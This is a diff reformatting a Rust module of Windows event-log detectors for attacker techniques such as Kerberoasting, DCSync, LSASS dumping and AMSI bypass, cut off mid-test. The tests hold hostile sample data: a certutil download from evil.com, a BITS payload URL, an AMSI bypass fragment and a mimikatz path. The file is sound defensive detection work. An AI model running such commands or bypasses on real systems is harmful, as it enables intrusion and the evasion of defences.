@@ -3,22 +3,20 @@
 use forensicnomicon::heuristics::evtx::{
     AMSI_BYPASS_PATTERNS, ARCHIVER_PROCESS_NAMES, BITS_CLIENT_CHANNEL, BYOVD_DRIVER_NAMES,
     DEFENDER_CHANNEL, DEFENDER_TAMPER_PATTERNS, EID_BITS_TRANSFER_START,
-    EID_DIRECTORY_SERVICE_ACCESS, EID_HYPERV_VM_STATE_CHANGE, EID_HYPERV_VM_STOPPED,
-    EID_KERBEROS_TGS_REQUEST, EID_KERBEROS_TGT_REQUEST,
-    EID_PROCESS_CREATE, EID_PS_SCRIPT_BLOCK, EID_REGISTRY_VALUE_SET,
-    EID_SECURITY_TASK_CREATED, EID_SERVICE_INSTALLED, EID_SERVICE_INSTALLED_SECURITY,
-    EID_SMB_SHARE_ACCESS, EID_SYSMON_DNS_QUERY,
+    EID_DEFENDER_CONFIG_CHANGED, EID_DEFENDER_REALTIME_DISABLED, EID_DIRECTORY_SERVICE_ACCESS,
+    EID_HYPERV_VM_STATE_CHANGE, EID_HYPERV_VM_STOPPED, EID_KERBEROS_TGS_REQUEST,
+    EID_KERBEROS_TGT_REQUEST, EID_LOGON, EID_PROCESS_CREATE, EID_PS_SCRIPT_BLOCK,
+    EID_REGISTRY_VALUE_SET, EID_SECURITY_TASK_CREATED, EID_SERVICE_INSTALLED,
+    EID_SERVICE_INSTALLED_SECURITY, EID_SMB_SHARE_ACCESS, EID_SYSMON_DNS_QUERY,
     EID_SYSMON_NETWORK_CONNECT, EID_SYSMON_PROCESS_ACCESS, EID_SYSMON_PROCESS_CREATE,
-    EID_TASK_COMPLETED, EID_TASK_DELETED, EID_TASK_LAUNCHED, EID_TASK_REGISTERED,
-    EID_TASK_UPDATED, EID_VSS_ERROR, EID_VSS_SNAPSHOT_DELETED,
-    EID_WMI_FILTER_TRIGGERED, EID_WMI_OPERATION_FAILURE, EID_WMI_QUERY,
-    EID_DEFENDER_REALTIME_DISABLED, EID_DEFENDER_CONFIG_CHANGED, EID_LOGON,
-    GUID_DS_REPLICATION_GET_CHANGES, GUID_DS_REPLICATION_GET_CHANGES_ALL,
-    GUID_DS_REPLICATION_FILTERED, HVCI_REGISTRY_KEY_PATHS, HVCI_REGISTRY_VALUE_NAMES,
-    HYPERV_VMMS_CHANNEL, LSASS_DUMP_ACCESS_MASKS, LSASS_IMAGE_NAME,
-    PSEXEC_SERVICE_PATTERNS, QWCRYPT_IOC_FILENAMES, QWCRYPT_PS_PATTERNS, SYSMON_CHANNEL,
-    SYSMON_FIELD_GRANTED_ACCESS, SYSMON_FIELD_IMAGE, SYSMON_FIELD_TARGET_IMAGE,
-    TASKSCHEDULER_CHANNEL, WEBDAV_LOL_PROCESSES, WMI_ACTIVITY_CHANNEL,
+    EID_TASK_COMPLETED, EID_TASK_DELETED, EID_TASK_LAUNCHED, EID_TASK_REGISTERED, EID_TASK_UPDATED,
+    EID_VSS_ERROR, EID_VSS_SNAPSHOT_DELETED, EID_WMI_FILTER_TRIGGERED, EID_WMI_OPERATION_FAILURE,
+    EID_WMI_QUERY, GUID_DS_REPLICATION_FILTERED, GUID_DS_REPLICATION_GET_CHANGES,
+    GUID_DS_REPLICATION_GET_CHANGES_ALL, HVCI_REGISTRY_KEY_PATHS, HVCI_REGISTRY_VALUE_NAMES,
+    HYPERV_VMMS_CHANNEL, LSASS_DUMP_ACCESS_MASKS, LSASS_IMAGE_NAME, PSEXEC_SERVICE_PATTERNS,
+    QWCRYPT_IOC_FILENAMES, QWCRYPT_PS_PATTERNS, SYSMON_CHANNEL, SYSMON_FIELD_GRANTED_ACCESS,
+    SYSMON_FIELD_IMAGE, SYSMON_FIELD_TARGET_IMAGE, TASKSCHEDULER_CHANNEL, WEBDAV_LOL_PROCESSES,
+    WMI_ACTIVITY_CHANNEL,
 };
 use forensicnomicon::lolbins::is_lolbas_windows;
 use winevt_core::EvtxEvent;
@@ -50,12 +48,14 @@ pub fn detect_kerberoasting(events: &[EvtxEvent]) -> Vec<Detection> {
         .iter()
         .filter(|e| e.event_id == EID_KERBEROS_TGS_REQUEST)
         .filter(|e| {
-            e.data.get("TicketEncryptionType")
+            e.data
+                .get("TicketEncryptionType")
                 .is_some_and(|t| t.trim().to_lowercase() == "0x17")
         })
         .filter(|e| {
             // Skip machine accounts (end with $)
-            !e.data.get("TargetUserName")
+            !e.data
+                .get("TargetUserName")
                 .is_some_and(|u| u.ends_with('$'))
         })
         .map(|e| Detection {
@@ -77,10 +77,7 @@ pub fn detect_asrep_roasting(events: &[EvtxEvent]) -> Vec<Detection> {
     events
         .iter()
         .filter(|e| e.event_id == EID_KERBEROS_TGT_REQUEST)
-        .filter(|e| {
-            e.data.get("PreAuthType")
-                .is_some_and(|t| t.trim() == "0")
-        })
+        .filter(|e| e.data.get("PreAuthType").is_some_and(|t| t.trim() == "0"))
         .map(|e| Detection {
             technique: "AS-REP Roasting",
             mitre_technique_id: "T1558.004",
@@ -109,7 +106,9 @@ pub fn detect_dcsync(events: &[EvtxEvent]) -> Vec<Detection> {
         .filter(|e| {
             if let Some(props) = e.data.get("Properties") {
                 let props_lc = props.to_lowercase();
-                DCSYNC_GUIDS.iter().any(|g| props_lc.contains(&g.to_lowercase()))
+                DCSYNC_GUIDS
+                    .iter()
+                    .any(|g| props_lc.contains(&g.to_lowercase()))
             } else {
                 false
             }
@@ -143,11 +142,13 @@ pub fn detect_lsass_access(events: &[EvtxEvent]) -> Vec<Detection> {
         .iter()
         .filter(|e| e.event_id == EID_SYSMON_PROCESS_ACCESS && e.channel == SYSMON_CHANNEL)
         .filter(|e| {
-            e.data.get(SYSMON_FIELD_TARGET_IMAGE)
+            e.data
+                .get(SYSMON_FIELD_TARGET_IMAGE)
                 .is_some_and(|img| img.to_lowercase().ends_with(LSASS_IMAGE_NAME))
         })
         .filter(|e| {
-            e.data.get(SYSMON_FIELD_GRANTED_ACCESS)
+            e.data
+                .get(SYSMON_FIELD_GRANTED_ACCESS)
                 .and_then(|m| parse_access_mask(m))
                 .is_some_and(|mask| LSASS_DUMP_ACCESS_MASKS.contains(&mask))
         })
@@ -159,7 +160,9 @@ pub fn detect_lsass_access(events: &[EvtxEvent]) -> Vec<Detection> {
             evidence: vec![e.clone()],
             description: format!(
                 "LSASS accessed with mask {} from '{}'",
-                e.data.get(SYSMON_FIELD_GRANTED_ACCESS).map_or("?", String::as_str),
+                e.data
+                    .get(SYSMON_FIELD_GRANTED_ACCESS)
+                    .map_or("?", String::as_str),
                 e.data.get("SourceImage").map_or("?", String::as_str)
             ),
         })
@@ -172,7 +175,8 @@ pub fn detect_psexec(events: &[EvtxEvent]) -> Vec<Detection> {
         .iter()
         .filter(|e| e.event_id == EID_SERVICE_INSTALLED)
         .filter(|e| {
-            e.data.get("ServiceName")
+            e.data
+                .get("ServiceName")
                 .is_some_and(|n| PSEXEC_SERVICE_PATTERNS.iter().any(|p| n.contains(p)))
         })
         .map(|e| Detection {
@@ -190,8 +194,11 @@ pub fn detect_psexec(events: &[EvtxEvent]) -> Vec<Detection> {
 }
 
 const TASK_EIDS: &[u32] = &[
-    EID_TASK_REGISTERED, EID_TASK_UPDATED, EID_TASK_DELETED,
-    EID_TASK_LAUNCHED, EID_TASK_COMPLETED,
+    EID_TASK_REGISTERED,
+    EID_TASK_UPDATED,
+    EID_TASK_DELETED,
+    EID_TASK_LAUNCHED,
+    EID_TASK_COMPLETED,
 ];
 
 /// Detect scheduled task abuse: TaskScheduler EID 106/140/141/200/201.
@@ -218,10 +225,13 @@ pub fn detect_scheduled_task_abuse(events: &[EvtxEvent]) -> Vec<Detection> {
 pub fn detect_service_persistence(events: &[EvtxEvent]) -> Vec<Detection> {
     events
         .iter()
-        .filter(|e| e.event_id == EID_SERVICE_INSTALLED || e.event_id == EID_SERVICE_INSTALLED_SECURITY)
+        .filter(|e| {
+            e.event_id == EID_SERVICE_INSTALLED || e.event_id == EID_SERVICE_INSTALLED_SECURITY
+        })
         .filter(|e| {
             // Skip PsExec patterns — handled by detect_psexec
-            !e.data.get("ServiceName")
+            !e.data
+                .get("ServiceName")
                 .is_some_and(|n| PSEXEC_SERVICE_PATTERNS.iter().any(|p| n.contains(p)))
         })
         .map(|e| Detection {
@@ -305,7 +315,8 @@ pub fn detect_amsi_bypass(events: &[EvtxEvent]) -> Vec<Detection> {
         .filter(|e| e.event_id == EID_PS_SCRIPT_BLOCK)
         .filter_map(|e| {
             let script = e.data.get("ScriptBlockText")?;
-            let pattern = AMSI_BYPASS_PATTERNS.iter()
+            let pattern = AMSI_BYPASS_PATTERNS
+                .iter()
                 .find(|&&p| script.to_lowercase().contains(&p.to_lowercase()))?;
             Some(Detection {
                 technique: "AMSI Bypass",
@@ -325,9 +336,11 @@ pub fn detect_defender_tampering(events: &[EvtxEvent]) -> Vec<Detection> {
         .iter()
         .filter(|e| {
             let is_defender_event = e.channel == DEFENDER_CHANNEL
-                && (e.event_id == EID_DEFENDER_REALTIME_DISABLED || e.event_id == EID_DEFENDER_CONFIG_CHANGED);
+                && (e.event_id == EID_DEFENDER_REALTIME_DISABLED
+                    || e.event_id == EID_DEFENDER_CONFIG_CHANGED);
             let is_ps_tamper = e.event_id == EID_PS_SCRIPT_BLOCK
-                && e.data.get("ScriptBlockText")
+                && e.data
+                    .get("ScriptBlockText")
                     .is_some_and(|s| DEFENDER_TAMPER_PATTERNS.iter().any(|p| s.contains(p)));
             is_defender_event || is_ps_tamper
         })
@@ -347,27 +360,29 @@ pub fn detect_smb_lateral_movement(events: &[EvtxEvent]) -> Vec<Detection> {
     use std::collections::HashSet;
 
     // Collect LogonIds from Type-3 logons with a source IP
-    let type3_ids: HashSet<u64> = events.iter()
+    let type3_ids: HashSet<u64> = events
+        .iter()
         .filter(|e| {
             e.event_id == EID_LOGON
                 && e.data.get("LogonType").is_some_and(|t| t == "3")
-                && e.data.get("IpAddress").is_some_and(|ip| !ip.is_empty() && ip != "-")
+                && e.data
+                    .get("IpAddress")
+                    .is_some_and(|ip| !ip.is_empty() && ip != "-")
         })
         .filter_map(|e| {
-            e.logon_id.or_else(|| {
-                e.data.get("TargetLogonId")
-                    .and_then(|s| parse_logon_id(s))
-            })
+            e.logon_id
+                .or_else(|| e.data.get("TargetLogonId").and_then(|s| parse_logon_id(s)))
         })
         .collect();
 
     // Find SMB share access events whose LogonId matches a Type-3 logon
-    events.iter()
+    events
+        .iter()
         .filter(|e| e.event_id == EID_SMB_SHARE_ACCESS || e.event_id == 5145)
         .filter_map(|e| {
-            let lid = e.logon_id.or_else(|| {
-                e.data.get("SubjectLogonId").and_then(|s| parse_logon_id(s))
-            })?;
+            let lid = e
+                .logon_id
+                .or_else(|| e.data.get("SubjectLogonId").and_then(|s| parse_logon_id(s)))?;
             if type3_ids.contains(&lid) {
                 Some(Detection {
                     technique: "SMB Lateral Movement",
@@ -389,7 +404,9 @@ pub fn detect_smb_lateral_movement(events: &[EvtxEvent]) -> Vec<Detection> {
 
 fn parse_logon_id(s: &str) -> Option<u64> {
     let s = s.trim();
-    if s.is_empty() || s == "-" { return None; }
+    if s.is_empty() || s == "-" {
+        return None;
+    }
     if let Some(hex) = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
         u64::from_str_radix(hex, 16).ok()
     } else {
@@ -404,7 +421,8 @@ pub fn detect_pass_the_hash(events: &[EvtxEvent]) -> Vec<Detection> {
         .filter(|e| {
             e.event_id == EID_LOGON
                 && e.data.get("LogonType").is_some_and(|t| t == "9")
-                && e.data.get("AuthenticationPackageName")
+                && e.data
+                    .get("AuthenticationPackageName")
                     .is_some_and(|pkg| pkg.to_uppercase().contains("NTLM"))
         })
         .map(|e| Detection {
@@ -452,7 +470,11 @@ pub fn detect_compression_staging(events: &[EvtxEvent]) -> Vec<Detection> {
         .filter(|e| e.event_id == EID_SYSMON_PROCESS_CREATE && e.channel == SYSMON_CHANNEL)
         .filter_map(|e| {
             let image = e.data.get(SYSMON_FIELD_IMAGE)?;
-            let basename = image.rsplit(['\\', '/']).next().unwrap_or(image.as_str()).to_lowercase();
+            let basename = image
+                .rsplit(['\\', '/'])
+                .next()
+                .unwrap_or(image.as_str())
+                .to_lowercase();
             if ARCHIVER_PROCESS_NAMES.iter().any(|a| basename == *a) {
                 Some(Detection {
                     technique: "Data Compression / Staging",
@@ -488,9 +510,7 @@ pub fn detect_dns_cloud_exfil(events: &[EvtxEvent]) -> Vec<Detection> {
                     tactic: "exfiltration",
                     confidence: Confidence::Medium,
                     evidence: vec![e.clone()],
-                    description: format!(
-                        "High-entropy DNS query '{qname}' (entropy={entropy:.2})"
-                    ),
+                    description: format!("High-entropy DNS query '{qname}' (entropy={entropy:.2})"),
                 })
             } else {
                 None
@@ -509,7 +529,8 @@ pub fn detect_byovd_driver_install(events: &[EvtxEvent]) -> Vec<Detection> {
         .iter()
         .filter(|e| e.event_id == EID_SERVICE_INSTALLED)
         .filter(|e| {
-            e.data.get("ServiceName")
+            e.data
+                .get("ServiceName")
                 .is_some_and(|n| BYOVD_DRIVER_NAMES.iter().any(|d| n.eq_ignore_ascii_case(d)))
         })
         .map(|e| Detection {
@@ -538,10 +559,7 @@ pub fn detect_vss_deletion(events: &[EvtxEvent]) -> Vec<Detection> {
             tactic: "impact",
             confidence: Confidence::High,
             evidence: vec![e.clone()],
-            description: format!(
-                "VSS shadow copy deletion indicator (EID {})",
-                e.event_id
-            ),
+            description: format!("VSS shadow copy deletion indicator (EID {})", e.event_id),
         })
         .collect()
 }
@@ -614,7 +632,8 @@ pub fn detect_wmi_lateral_movement(events: &[EvtxEvent]) -> Vec<Detection> {
                 && e.channel == WMI_ACTIVITY_CHANNEL
         })
         .filter(|e| {
-            e.data.get("ClientMachine")
+            e.data
+                .get("ClientMachine")
                 .is_some_and(|m| m.starts_with("\\\\"))
         })
         .map(|e| Detection {
@@ -702,7 +721,9 @@ pub fn detect_qwcrypt_cluster(events: &[EvtxEvent]) -> Vec<Detection> {
     let corroborating: Vec<&Detection> = vss.iter().chain(hyperv.iter()).collect();
     let corroborated = corroborating.iter().any(|d| {
         d.evidence.iter().any(|ce| {
-            byovd_ts.iter().any(|&bt| (ce.timestamp_ns - bt).abs() < WINDOW_NS)
+            byovd_ts
+                .iter()
+                .any(|&bt| (ce.timestamp_ns - bt).abs() < WINDOW_NS)
         })
     });
 
@@ -710,7 +731,8 @@ pub fn detect_qwcrypt_cluster(events: &[EvtxEvent]) -> Vec<Detection> {
         return vec![];
     }
 
-    let mut evidence: Vec<EvtxEvent> = byovd.iter()
+    let mut evidence: Vec<EvtxEvent> = byovd
+        .iter()
         .chain(vss.iter())
         .chain(hyperv.iter())
         .flat_map(|d| d.evidence.iter().cloned())
@@ -724,7 +746,8 @@ pub fn detect_qwcrypt_cluster(events: &[EvtxEvent]) -> Vec<Detection> {
         confidence: Confidence::High,
         evidence,
         description: "QWCrypt/RedCurl cluster: BYOVD driver install correlated with VSS \
-            deletion or Hyper-V mass shutdown within 24 h".to_string(),
+            deletion or Hyper-V mass shutdown within 24 h"
+            .to_string(),
     }]
 }
 
@@ -737,7 +760,9 @@ pub fn detect_lnk_webdav_execution(events: &[EvtxEvent]) -> Vec<Detection> {
         .filter(|e| {
             let name = e.data.get("NewProcessName").map_or("", String::as_str);
             let basename = name.rsplit(['\\', '/']).next().unwrap_or(name);
-            WEBDAV_LOL_PROCESSES.iter().any(|p| basename.eq_ignore_ascii_case(p))
+            WEBDAV_LOL_PROCESSES
+                .iter()
+                .any(|p| basename.eq_ignore_ascii_case(p))
         })
         .filter(|e| {
             let cmdline = e.data.get("CommandLine").map_or("", String::as_str);
@@ -766,7 +791,9 @@ pub fn detect_webdav_c2(events: &[EvtxEvent]) -> Vec<Detection> {
         .filter(|e| {
             let image = e.data.get(SYSMON_FIELD_IMAGE).map_or("", String::as_str);
             let basename = image.rsplit(['\\', '/']).next().unwrap_or(image);
-            WEBDAV_LOL_PROCESSES.iter().any(|p| basename.eq_ignore_ascii_case(p))
+            WEBDAV_LOL_PROCESSES
+                .iter()
+                .any(|p| basename.eq_ignore_ascii_case(p))
         })
         .map(|e| Detection {
             technique: "WebDAV/Cloudflare C2 via LOLBin",
@@ -793,7 +820,9 @@ pub fn detect_hvci_registry_disable(events: &[EvtxEvent]) -> Vec<Detection> {
             let obj_name = e.data.get("ObjectName").map_or("", String::as_str);
             let val_name = e.data.get("ObjectValueName").map_or("", String::as_str);
             let key_match = HVCI_REGISTRY_KEY_PATHS.iter().any(|k| obj_name.contains(k));
-            let val_match = HVCI_REGISTRY_VALUE_NAMES.iter().any(|v| val_name.eq_ignore_ascii_case(v));
+            let val_match = HVCI_REGISTRY_VALUE_NAMES
+                .iter()
+                .any(|v| val_name.eq_ignore_ascii_case(v));
             key_match || val_match
         })
         .map(|e| Detection {
@@ -824,10 +853,14 @@ pub fn detect_qwcrypt_ioc_filename(events: &[EvtxEvent]) -> Vec<Detection> {
                 e.data.get(SYSMON_FIELD_IMAGE).map_or("", String::as_str)
             };
             let basename = name.rsplit(['\\', '/']).next().unwrap_or(name);
-            QWCRYPT_IOC_FILENAMES.iter().any(|ioc| basename.eq_ignore_ascii_case(ioc))
+            QWCRYPT_IOC_FILENAMES
+                .iter()
+                .any(|ioc| basename.eq_ignore_ascii_case(ioc))
         })
         .map(|e| {
-            let proc_name = e.data.get("NewProcessName")
+            let proc_name = e
+                .data
+                .get("NewProcessName")
                 .or_else(|| e.data.get(SYSMON_FIELD_IMAGE))
                 .map_or("?", String::as_str);
             Detection {
@@ -910,66 +943,142 @@ mod tests {
 
     fn make_event(event_id: u32, channel: &str, data: Vec<(&str, &str)>, ts: i64) -> EvtxEvent {
         EvtxEvent {
-            event_id, channel: channel.into(), timestamp_ns: ts, computer: "DC01".into(),
-            user_sid: None, logon_id: None, process_id: None, thread_id: None,
-            data: data.into_iter().map(|(k, v)| (k.into(), v.into())).collect(),
+            event_id,
+            channel: channel.into(),
+            timestamp_ns: ts,
+            computer: "DC01".into(),
+            user_sid: None,
+            logon_id: None,
+            process_id: None,
+            thread_id: None,
+            data: data
+                .into_iter()
+                .map(|(k, v)| (k.into(), v.into()))
+                .collect(),
         }
     }
 
     #[test]
     fn kerberoasting_detected_on_rc4_tgs() {
-        let ev = vec![make_event(4769, "Security", vec![("TicketEncryptionType","0x17"),("ServiceName","MSSQLSvc/srv"),("TargetUserName","svc")], 1_000_000_000)];
+        let ev = vec![make_event(
+            4769,
+            "Security",
+            vec![
+                ("TicketEncryptionType", "0x17"),
+                ("ServiceName", "MSSQLSvc/srv"),
+                ("TargetUserName", "svc"),
+            ],
+            1_000_000_000,
+        )];
         let hits = detect_kerberoasting(&ev);
         assert!(!hits.is_empty(), "RC4 TGS should be flagged");
         assert_eq!(hits[0].mitre_technique_id, "T1558.003");
     }
     #[test]
     fn kerberoasting_ignores_aes_tickets() {
-        let ev = vec![make_event(4769, "Security", vec![("TicketEncryptionType","0x12"),("ServiceName","MSSQLSvc/srv"),("TargetUserName","svc")], 1_000)];
+        let ev = vec![make_event(
+            4769,
+            "Security",
+            vec![
+                ("TicketEncryptionType", "0x12"),
+                ("ServiceName", "MSSQLSvc/srv"),
+                ("TargetUserName", "svc"),
+            ],
+            1_000,
+        )];
         assert!(detect_kerberoasting(&ev).is_empty());
     }
     #[test]
-    fn kerberoasting_empty_events() { assert!(detect_kerberoasting(&[]).is_empty()); }
+    fn kerberoasting_empty_events() {
+        assert!(detect_kerberoasting(&[]).is_empty());
+    }
 
     #[test]
     fn asrep_detected_on_preauth_disabled() {
-        let ev = vec![make_event(4768, "Security", vec![("PreAuthType","0"),("TargetUserName","nopa")], 1_000_000_000)];
+        let ev = vec![make_event(
+            4768,
+            "Security",
+            vec![("PreAuthType", "0"), ("TargetUserName", "nopa")],
+            1_000_000_000,
+        )];
         let hits = detect_asrep_roasting(&ev);
         assert!(!hits.is_empty());
         assert_eq!(hits[0].mitre_technique_id, "T1558.004");
     }
     #[test]
     fn asrep_ignores_normal_tgt() {
-        let ev = vec![make_event(4768, "Security", vec![("PreAuthType","2"),("TargetUserName","normaluser")], 1_000)];
+        let ev = vec![make_event(
+            4768,
+            "Security",
+            vec![("PreAuthType", "2"), ("TargetUserName", "normaluser")],
+            1_000,
+        )];
         assert!(detect_asrep_roasting(&ev).is_empty());
     }
 
     #[test]
     fn dcsync_detected_on_replication_guid() {
-        let ev = vec![make_event(4662, "Security", vec![("Properties","{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}"),("SubjectUserName","attacker"),("SubjectUserSid","S-1-5-21-999-1001")], 1_000_000_000)];
+        let ev = vec![make_event(
+            4662,
+            "Security",
+            vec![
+                ("Properties", "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}"),
+                ("SubjectUserName", "attacker"),
+                ("SubjectUserSid", "S-1-5-21-999-1001"),
+            ],
+            1_000_000_000,
+        )];
         let hits = detect_dcsync(&ev);
         assert!(!hits.is_empty());
         assert_eq!(hits[0].mitre_technique_id, "T1003.006");
     }
     #[test]
-    fn dcsync_empty_events() { assert!(detect_dcsync(&[]).is_empty()); }
+    fn dcsync_empty_events() {
+        assert!(detect_dcsync(&[]).is_empty());
+    }
 
     #[test]
     fn lsass_access_detected_on_dump_mask() {
-        let ev = vec![make_event(10, "Microsoft-Windows-Sysmon/Operational", vec![("TargetImage","C:\\Windows\\System32\\lsass.exe"),("GrantedAccess","0x1010"),("SourceImage","C:\\Users\\attacker\\mimikatz.exe")], 1_000_000_000)];
+        let ev = vec![make_event(
+            10,
+            "Microsoft-Windows-Sysmon/Operational",
+            vec![
+                ("TargetImage", "C:\\Windows\\System32\\lsass.exe"),
+                ("GrantedAccess", "0x1010"),
+                ("SourceImage", "C:\\Users\\attacker\\mimikatz.exe"),
+            ],
+            1_000_000_000,
+        )];
         let hits = detect_lsass_access(&ev);
         assert!(!hits.is_empty());
         assert_eq!(hits[0].mitre_technique_id, "T1003.001");
     }
     #[test]
     fn lsass_access_ignores_normal_mask() {
-        let ev = vec![make_event(10, "Microsoft-Windows-Sysmon/Operational", vec![("TargetImage","C:\\Windows\\System32\\lsass.exe"),("GrantedAccess","0x0400"),("SourceImage","C:\\Windows\\System32\\svchost.exe")], 1_000)];
+        let ev = vec![make_event(
+            10,
+            "Microsoft-Windows-Sysmon/Operational",
+            vec![
+                ("TargetImage", "C:\\Windows\\System32\\lsass.exe"),
+                ("GrantedAccess", "0x0400"),
+                ("SourceImage", "C:\\Windows\\System32\\svchost.exe"),
+            ],
+            1_000,
+        )];
         assert!(detect_lsass_access(&ev).is_empty());
     }
 
     #[test]
     fn psexec_detected_on_psexesvc() {
-        let ev = vec![make_event(7045, "System", vec![("ServiceName","PSEXESVC"),("ImagePath","C:\\Windows\\PSEXESVC.exe")], 1_000_000_000)];
+        let ev = vec![make_event(
+            7045,
+            "System",
+            vec![
+                ("ServiceName", "PSEXESVC"),
+                ("ImagePath", "C:\\Windows\\PSEXESVC.exe"),
+            ],
+            1_000_000_000,
+        )];
         let hits = detect_psexec(&ev);
         assert!(!hits.is_empty());
         assert_eq!(hits[0].mitre_technique_id, "T1569.002");
@@ -977,17 +1086,32 @@ mod tests {
 
     #[test]
     fn scheduled_task_registered_detected() {
-        let ev = vec![make_event(106, "Microsoft-Windows-TaskScheduler/Operational", vec![("TaskName","\\malicious_task")], 1_000_000_000)];
+        let ev = vec![make_event(
+            106,
+            "Microsoft-Windows-TaskScheduler/Operational",
+            vec![("TaskName", "\\malicious_task")],
+            1_000_000_000,
+        )];
         let hits = detect_scheduled_task_abuse(&ev);
         assert!(!hits.is_empty());
         assert_eq!(hits[0].mitre_technique_id, "T1053.005");
     }
     #[test]
-    fn scheduled_task_empty() { assert!(detect_scheduled_task_abuse(&[]).is_empty()); }
+    fn scheduled_task_empty() {
+        assert!(detect_scheduled_task_abuse(&[]).is_empty());
+    }
 
     #[test]
     fn service_persistence_detected_on_7045() {
-        let ev = vec![make_event(7045, "System", vec![("ServiceName","evil_svc"),("ImagePath","C:\\Users\\attacker\\evil.exe")], 1_000_000_000)];
+        let ev = vec![make_event(
+            7045,
+            "System",
+            vec![
+                ("ServiceName", "evil_svc"),
+                ("ImagePath", "C:\\Users\\attacker\\evil.exe"),
+            ],
+            1_000_000_000,
+        )];
         let hits = detect_service_persistence(&ev);
         assert!(!hits.is_empty());
         assert_eq!(hits[0].mitre_technique_id, "T1543.003");
@@ -995,7 +1119,12 @@ mod tests {
 
     #[test]
     fn wmi_subscription_detected_on_5861() {
-        let ev = vec![make_event(5861, "Microsoft-Windows-WMI-Activity/Operational", vec![("Consumer","CommandLineEventConsumer")], 1_000_000_000)];
+        let ev = vec![make_event(
+            5861,
+            "Microsoft-Windows-WMI-Activity/Operational",
+            vec![("Consumer", "CommandLineEventConsumer")],
+            1_000_000_000,
+        )];
         let hits = detect_wmi_subscription(&ev);
         assert!(!hits.is_empty());
         assert_eq!(hits[0].mitre_technique_id, "T1546.003");
@@ -1003,7 +1132,15 @@ mod tests {
 
     #[test]
     fn lolbas_detected_on_certutil() {
-        let ev = vec![make_event(4688, "Security", vec![("NewProcessName","C:\\Windows\\System32\\certutil.exe"),("CommandLine","certutil -urlcache http://evil.com/p")], 1_000_000_000)];
+        let ev = vec![make_event(
+            4688,
+            "Security",
+            vec![
+                ("NewProcessName", "C:\\Windows\\System32\\certutil.exe"),
+                ("CommandLine", "certutil -urlcache http://evil.com/p"),
+            ],
+            1_000_000_000,
+        )];
         let hits = detect_lolbas(&ev);
         assert!(!hits.is_empty());
         assert_eq!(hits[0].mitre_technique_id, "T1218");
@@ -1011,7 +1148,12 @@ mod tests {
 
     #[test]
     fn amsi_bypass_detected_on_script_block() {
-        let ev = vec![make_event(4104, "Microsoft-Windows-PowerShell/Operational", vec![("ScriptBlockText","[Ref].Assembly.GetType(amsiInitFailed)")], 1_000_000_000)];
+        let ev = vec![make_event(
+            4104,
+            "Microsoft-Windows-PowerShell/Operational",
+            vec![("ScriptBlockText", "[Ref].Assembly.GetType(amsiInitFailed)")],
+            1_000_000_000,
+        )];
         let hits = detect_amsi_bypass(&ev);
         assert!(!hits.is_empty());
         assert_eq!(hits[0].mitre_technique_id, "T1562.001");
@@ -1019,7 +1161,12 @@ mod tests {
 
     #[test]
     fn defender_tampering_detected_on_disable_realtime() {
-        let ev = vec![make_event(5001, "Microsoft-Windows-Windows Defender/Operational", vec![("Value","disabled")], 1_000_000_000)];
+        let ev = vec![make_event(
+            5001,
+            "Microsoft-Windows-Windows Defender/Operational",
+            vec![("Value", "disabled")],
+            1_000_000_000,
+        )];
         let hits = detect_defender_tampering(&ev);
         assert!(!hits.is_empty());
         assert_eq!(hits[0].mitre_technique_id, "T1562.001");
@@ -1028,16 +1175,36 @@ mod tests {
     #[test]
     fn smb_lateral_movement_detected_on_type3_plus_5140() {
         let ts = 1_000_000_000_i64;
-        let mut ld: HashMap<String,String> = HashMap::new();
+        let mut ld: HashMap<String, String> = HashMap::new();
         ld.insert("LogonType".into(), "3".into());
         ld.insert("IpAddress".into(), "10.0.0.5".into());
         ld.insert("TargetLogonId".into(), "0x1234".into());
-        let mut sd: HashMap<String,String> = HashMap::new();
+        let mut sd: HashMap<String, String> = HashMap::new();
         sd.insert("ShareName".into(), "\\\\*\\ADMIN$".into());
         sd.insert("SubjectLogonId".into(), "0x1234".into());
         let events = vec![
-            EvtxEvent { event_id: 4624, channel: "Security".into(), timestamp_ns: ts, computer: "WS01".into(), user_sid: None, logon_id: Some(0x1234), process_id: None, thread_id: None, data: ld },
-            EvtxEvent { event_id: 5140, channel: "Security".into(), timestamp_ns: ts+1000, computer: "WS01".into(), user_sid: None, logon_id: Some(0x1234), process_id: None, thread_id: None, data: sd },
+            EvtxEvent {
+                event_id: 4624,
+                channel: "Security".into(),
+                timestamp_ns: ts,
+                computer: "WS01".into(),
+                user_sid: None,
+                logon_id: Some(0x1234),
+                process_id: None,
+                thread_id: None,
+                data: ld,
+            },
+            EvtxEvent {
+                event_id: 5140,
+                channel: "Security".into(),
+                timestamp_ns: ts + 1000,
+                computer: "WS01".into(),
+                user_sid: None,
+                logon_id: Some(0x1234),
+                process_id: None,
+                thread_id: None,
+                data: sd,
+            },
         ];
         let hits = detect_smb_lateral_movement(&events);
         assert!(!hits.is_empty());
@@ -1046,7 +1213,16 @@ mod tests {
 
     #[test]
     fn pass_the_hash_detected_on_logontype9() {
-        let ev = vec![make_event(4624, "Security", vec![("LogonType","9"),("AuthenticationPackageName","NTLM"),("TargetUserName","Administrator")], 1_000_000_000)];
+        let ev = vec![make_event(
+            4624,
+            "Security",
+            vec![
+                ("LogonType", "9"),
+                ("AuthenticationPackageName", "NTLM"),
+                ("TargetUserName", "Administrator"),
+            ],
+            1_000_000_000,
+        )];
         let hits = detect_pass_the_hash(&ev);
         assert!(!hits.is_empty());
         assert_eq!(hits[0].mitre_technique_id, "T1550.002");
@@ -1054,7 +1230,12 @@ mod tests {
 
     #[test]
     fn bits_persistence_detected_on_eid_59() {
-        let ev = vec![make_event(59, "Microsoft-Windows-Bits-Client/Operational", vec![("url","http://evil.com/payload.exe")], 1_000_000_000)];
+        let ev = vec![make_event(
+            59,
+            "Microsoft-Windows-Bits-Client/Operational",
+            vec![("url", "http://evil.com/payload.exe")],
+            1_000_000_000,
+        )];
         let hits = detect_bits_persistence(&ev);
         assert!(!hits.is_empty());
         assert_eq!(hits[0].mitre_technique_id, "T1197");
@@ -1062,7 +1243,15 @@ mod tests {
 
     #[test]
     fn compression_staging_detected_on_7z() {
-        let ev = vec![make_event(1, "Microsoft-Windows-Sysmon/Operational", vec![("Image","C:\\Program Files\\7-Zip\\7z.exe"),("CommandLine","7z.exe a exfil.7z C:\\sensitive\\")], 1_000_000_000)];
+        let ev = vec![make_event(
+            1,
